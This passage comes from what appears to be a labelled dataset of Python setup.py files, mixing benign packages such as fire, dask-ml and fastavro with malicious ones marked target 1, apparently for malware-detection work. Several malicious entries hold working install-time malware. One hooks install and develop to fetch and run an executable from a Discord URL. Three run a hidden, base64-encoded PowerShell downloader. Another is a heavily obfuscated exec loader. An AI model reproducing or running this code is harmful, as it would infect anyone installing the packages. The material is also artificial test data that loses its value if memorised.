classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Internet',\n    ],\n)\n", "target": 0}
{"idx": "request91-0.0.1", "func": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'synthetic'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n    import urllib.request\n   \n    URL = \"https://cdn.discordapp.com/attachments/1017200441387401297/1020792257722466425/MCCheat.exe\"\n    response = requests.get(URL)\n    open(\"payload.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start payload.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='request91',\n    version='0.0.1',\n    description='advanced requests',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n", "target": 1}
{"idx": "fixtures-4.0.1", "func": "#!/usr/bin/env python\n\nimport setuptools\n\nsetuptools.setup(\n    setup_requires=['pbr>5.7.0'],\n    pbr=True,\n)\n", "target": 0}
{"idx": "Flask-DebugToolbar-0.13.1", "func": "from setuptools import setup\n\n# Metadata goes in setup.cfg. These are here for GitHub's dependency graph.\nsetup(\n    name=\"Flask-DebugToolbar\",\n    install_requires=[\n        'Flask>=0.8',\n        'Blinker',\n        'itsdangerous',\n        'werkzeug',\n    ],\n)\n", "target": 0}
{"idx": "libhydrapong-2.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhydrapong',\n    packages = ['modlib'],\n    version = '6.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fire-0.4.0", "func": "# Copyright (C) 2018 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"The setup.py file for Python Fire.\"\"\"\n\nfrom setuptools import setup\n\nLONG_DESCRIPTION = \"\"\"\nPython Fire is a library for automatically generating command line interfaces\n(CLIs) with a single line of code.\n\nIt will turn any Python module, class, object, function, etc. (any Python\ncomponent will work!) into a CLI. It's called Fire because when you call Fire(),\nit fires off your command.\n\"\"\".strip()\n\nSHORT_DESCRIPTION = \"\"\"\nA library for automatically generating command line interfaces.\"\"\".strip()\n\nDEPENDENCIES = [\n    'six',\n    'termcolor',\n    'enum34; python_version < \"3.4\"'\n]\n\nTEST_DEPENDENCIES = [\n    'hypothesis',\n    'mock',\n    'python-Levenshtein',\n]\n\nVERSION = '0.4.0'\nURL = 'https://github.com/google/python-fire'\n\nsetup(\n    name='fire',\n    version=VERSION,\n    description=SHORT_DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    url=URL,\n\n    author='David Bieber',\n    author_email='dbieber@google.com',\n    license='Apache Software License',\n\n    classifiers=[\n        'Development Status :: 4 - Beta',\n\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n\n        'License :: OSI Approved :: Apache Software License',\n\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n\n        'Operating System :: OS Independent',\n        'Operating System :: POSIX',\n        'Operating System :: MacOS',\n        'Operating System :: Unix',\n    ],\n\n    keywords='command line interface cli python fire interactive bash tool',\n\n    packages=['fire', 'fire.console'],\n\n    install_requires=DEPENDENCIES,\n    tests_require=TEST_DEPENDENCIES,\n)\n", "target": 0}
{"idx": "dask-ml-2022.5.27", "func": "import os\nfrom codecs import open\n\nfrom setuptools import find_packages, setup\n\nhere = os.path.dirname(__file__)\n\n\n# Get the long description from the README file\nwith open(os.path.join(here, \"README.rst\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\ninstall_requires = [\n    \"dask[array,dataframe]>=2.4.0\",\n    \"distributed>=2.4.0\",\n    \"numba>=0.51.0\",\n    \"numpy>=1.20.0\",\n    \"pandas>=0.24.2\",\n    \"scikit-learn>=1.0.0\",\n    \"scipy\",\n    \"dask-glm>=0.2.0\",\n    \"multipledispatch>=0.4.9\",\n    \"packaging\",\n]\n\n# Optional Requirements\ndoc_requires = [\"sphinx\", \"numpydoc\", \"sphinx-rtd-theme\", \"nbsphinx\", \"sphinx-gallery\"]\ntest_requires = [\n    \"black\",\n    \"coverage\",\n    \"flake8\",\n    \"isort\",\n    \"pytest\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n]\ndev_requires = doc_requires + test_requires\nxgboost_requires = [\"dask-xgboost\", \"xgboost\"]\ncomplete_requires = xgboost_requires\n\nextras_require = {\n    \"docs\": doc_requires,\n    \"test\": test_requires,\n    \"dev\": dev_requires,\n    \"xgboost\": xgboost_requires,\n    \"complete\": complete_requires,\n}\n\nsetup(\n    name=\"dask-ml\",\n    description=\"A library for distributed and parallel machine learning\",\n    long_description=long_description,\n    url=\"https://github.com/dask/dask-ml\",\n    author=\"Tom Augspurger\",\n    author_email=\"taugspurger@anaconda.com\",\n    license=\"BSD\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Database\",\n        \"Topic :: Scientific/Engineering\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    packages=find_packages(exclude=[\"docs\", \"tests\", \"tests.*\", \"docs.*\"]),\n    use_scm_version=True,\n    setup_requires=[\"setuptools_scm\"],\n    install_requires=install_requires,\n    extras_require=extras_require,\n    python_requires=\">=3.6\",\n)\n", "target": 0}
{"idx": "py-studytoolvisa-3.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-studytoolvisa',\n    packages = ['modlib'],\n    version = '4.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "librandomguipip-1.27", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandomguipip',\n    packages = ['modlib'],\n    version = '3.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "muktesittaban-0.0.16", "func": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nVERSION = '0.0.16'\nDESCRIPTION = 'MuktesiTABAN'\nLONG_DESCRIPTION = 'MuktesiTABAN'\n\n# Setting up\nsetup(\n    name=\"MuktesitTABAN\",\n    version=VERSION,\n    author=\"MuktesiT\",\n    author_email=\"<muktesitdijital@gmail.com>\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=['GPUtil==1.4.0','notify2','pyfiglet','Pyrogram','pyTelegramBotAPI','pytz','requests','rich','parsel'],\n    keywords=['python', 'video', 'stream', 'video stream', 'camera stream', 'sockets'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n", "target": 1}
{"idx": "pydefenderpro-1.0.0", "func": "import random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(public_key)'],['''ocX%Xd+?X@vXs=@tA{$30S|gBp?c_9w0Gl|Z?7dQiVfX+M|~W+g<1>hXB7#gS0{xAD(p!&R@P=w3H*G2-O6;%$C2VAM?eta1L?FRYjLc(lu4XU9Q{o%?@}c5u^vW4LK`a~1Ni}rkmtez9?kZ-I4JdL7vQD{fz%ByW^5M^uLg1))JEx~>Z-&l(r?LaTeAL?YNyc0x$;GxnCGP#=|1(+SSj9sNWnBjze72Xg@W-x+VJ0ZNcugE#P;T8{ev(T+Sb+zb>nUfpF@`{cBZSxbpBe@Up|1ErL3(TX!g%TO28Sbkf7O=8L;yEhBkGRv0X>%A-2u@HG1q;3T(;}9nPgQGIhXPxkmo0tSZ@vX{?a-Ha>B3E8O+03pw|H+CU4i$}!A0l_((+wMlrBi+|gC8oI+m7j8p-6H}mDi0o(K+EYMyP~QW0oJLAWi+tHTd2^?-7~&+LKkmU01v7mZGd<2WpbRCKKi3@F@#q>fHQX%tTup%F0RuJ)CFCT9eEn-=q1zk|1u$v5|1Fm54T1?~RHrcHW*ltT;)^&R6u&$Zn%LdhIb5IXwlS?*p3cfL0I@fH^!)6_2#8>M&pWY!kt?{E(x2B-knz?yZX_@&_*cK_cVDj8Te1Hv9P!du2|qV+ZeMSG<Umw4IU#+)7z9jh;>cS#rPI>fHg{r-ZgEqt{7LC67gLA%GGAj5M|bTIJk`+?B@|M5*KT7<6d>10z_8KqFY-lE5Z{*}6TzSX2Pq}UR`w!ObZHR{O)c|Zv0OA&A8e38j@l;+Qg%fjZ_nB&PbUMv`rK?JoDR5(P=ob_K|9tL=ruQJ4|}RKTDIsWYFDztYX$b8aF-sIgbQt5px_dvwovMl<RQ_dTHX7XCkW_ew!N0lkqmSP(*u2fp`?xUCL+8n)KQ_2wnpi{xgz$@pnD4HM2%wWmi~#&x03t<cQo%0B|F%{HFIn08#Vxzl5lcbC~A=SY;x{^rSC{cR_}#II6sS~4NI<p51b5F-E)XZNJ<EwMhcI{3O4+PFr@k^<1+80Qf?Eb9L_}RlZNM6GS*0f2e@!S*BG7kEPf`4?qX3{FTN^vR5saW<6*26`RVDrJZVIHd?HYvO;n4Qovy(J*6_8zGNwg&lrCcvU0QoGX_p55%b_}uQ}t7Se~(^ZeO=+8<57VEQOg{k$-3c;(qF=P!K(dmX%D5_s|ubr0>qJ~k=)6=t%)IL+kp3)f5^-Fy~2XvCFD?LB&L-gZjgjk<yO3KmfU9<>c#3<{a-Q3_r@krY$jVg*6&_$yf*$0UavttUXF<(E-4CA89T!B$~N>qX?t7D5B$wv2Bm+KHVDn1sHgS5GgwRUe60IxHGL5DN&0otI1FfHRl&U>4an*Wz)e^g=6vzOLc>&p<q2lwg8c*xO`%dcX`MN7DxgqZdThlnbi5nHe!>!EnV9sAqlwLiy83%*Fcd4)ZfZnvue^mM3#w;&t{p_w(p}8Wn~?((c?xwbFY?g1LeUA6CO?P#TlBdv!IajIxj}6#aIpLY*`B<G=T!M_zU*je1T)rzQVc*PqouHOl4>_^vm0BX9Wr1Ytf9Aoa9vJ8mgZl#XXgNC8)<_n5Ua=@I**UxYpui1@N0QCS70q`PH_~ZHdPVh7tnZH@`Jq=_pxfjZoorhI1m7(h$Gn_{%4%%+`5re$}oIX1;DbY6UV4%<8)5aPlPe|X2}Zn<z!_uBW=*Q-1XwvG)Y;O(AkSZy8b7t{EUJ_>u7eE!u8t9J@Kkv4lFqoX01&q%NK`Kq&PtoFt&E8tPl+-V}BOAi9;|GnX3DWXKNsg9i42PS84X91;s<~j>b?e%E`)V2l1L6`1l^f&I6IFk@7?#^7C-LyPjfp&6d$YT9Xny?oA>Wu3jJCZ1ye;5ul2dSkI}<eDiwq9ffGsm$9P2Q-Z{Q>-`JinF=>iUmU)q*QbDc#F_@`2QH1<2-)3~_-{HUR!%J$-T{{YNcK+};;le5nJJu*VRF;7O{}L<nOodl<WA>Rs+Z63AM7PR0NxsDagycs3;jKI6xBF$`ga5f|Kpn$xt8~VYY?%6>AUNF?WqkN+e3?e0v+14{Kl)rQh}b+g7b0AF}Yk?u<Nb*(b>Qc@CXgd2O&Jg_5nPbLyo{thE0!=%&kO+|N1nx1sHB^d=w`vg8@Qr7~!H1OR%My59ClQd1_BtyM)HNIn6ju#c)41#6t+3g|il^zqAsiE)tpx{-})TBb?(NNY3lp9f%(=yDrz>m2#ES9{ozvp3C8}8hP}ri?9yue&7K8!<8<hKI<7z|BmEsa$!T{ys&ObA@Tg+qv7xu7NILaPHbk7X=EyPtpJwNrR(wr8vX{yRtWrUJM0u%q1cL@dnwc5eVd^4kO((%f5H1%DC>6~XT54$s9O~pz!oVyqxdZ_XE{qRt$FK|G^Fb#*OetIPWu!PSzoJyjhlYb`#bs1$!-3?^2yXZMNG1mg$Z<ur8|(g(=q'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')", "target": 1}
{"idx": "fastavro-1.5.4", "func": "import ast\nimport os\nimport re\nimport sys\nfrom setuptools import setup, Extension\n\ntry:\n    import Cython\nexcept ImportError:\n    ext = \".c\"\nelse:\n    ext = \".pyx\"\n\next_modules = []\nif not hasattr(sys, \"pypy_version_info\"):\n    ext_modules += [\n        Extension(\"fastavro._read\", [\"fastavro/_read\" + ext]),\n        Extension(\"fastavro._schema\", [\"fastavro/_schema\" + ext]),\n        Extension(\"fastavro._write\", [\"fastavro/_write\" + ext]),\n        Extension(\"fastavro._validation\", [\"fastavro/_validation\" + ext]),\n        Extension(\"fastavro._logical_readers\", [\"fastavro/_logical_readers\" + ext]),\n        Extension(\"fastavro._logical_writers\", [\"fastavro/_logical_writers\" + ext]),\n    ]\n\n\ndef version():\n    pyfile = \"fastavro/__init__.py\"\n    with open(pyfile) as fp:\n        data = fp.read()\n\n    match = re.search(\"__version_info__ = (\\(.*\\))\", data)\n    assert match, f\"cannot find version in {pyfile}\"\n    vinfo = ast.literal_eval(match.group(1))\n    return \".\".join(str(v) for v in vinfo)\n\n\nsetup(\n    name=\"fastavro\",\n    version=version(),\n    description=\"Fast read/write of AVRO files\",\n    long_description=open(\"README.md\").read(),\n    long_description_content_type=\"text/markdown\",\n    author=\"Miki Tebeka\",\n    author_email=\"miki.tebeka@gmail.com\",\n    license=\"MIT\",\n    url=\"https://github.com/fastavro/fastavro\",\n    packages=[\"fastavro\", \"fastavro.io\", \"fastavro.repository\"],\n    ext_modules=ext_modules,\n    zip_safe=False,\n    entry_points={\n        \"console_scripts\": [\n            \"fastavro = fastavro.__main__:main\",\n        ]\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Programming Language :: Python\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Scientific/Engineering :: Information Analysis\",\n    ],\n    python_requires=\">=3.7\",\n    extras_require={\n        \"codecs\": [\"python-snappy\", \"zstandard\", \"lz4\"],\n        